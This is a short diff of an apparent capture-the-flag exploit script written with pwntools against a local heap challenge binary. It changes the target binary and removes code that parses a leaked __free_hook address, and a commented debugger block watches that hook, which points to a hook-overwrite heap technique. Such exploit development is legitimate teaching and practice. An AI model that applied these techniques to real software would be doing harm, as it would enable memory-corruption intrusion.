@@ -3,7 +3,7 @@ from pwn import *
 context.terminal = ["kitty", "-e", "sh", "-c"]
 
 
-p = process("./ringbuf_simulator")
+p = process("./put_a_ring_on_it_dbg_patched")
 # p = gdb.debug(
 #     "./ringbuf_simulator_dbg_patched",
 #     """b main
@@ -18,9 +18,6 @@ p = process("./ringbuf_simulator")
 #         watch *__free_hook
 #         """,
 # )
-freehook_line = p.recvline()
-FREE_HOOK_ADDRESS = int(freehook_line.split(b" ")[-1], 16)
-print(f"Got __free_hook address {FREE_HOOK_ADDRESS:#016x}")
 print(p.sendlineafter(b"> ", b"5000").decode("utf-8"))
 
 print(p.sendlineafter(b"> ", b"1000").decode("utf-8"))  # A
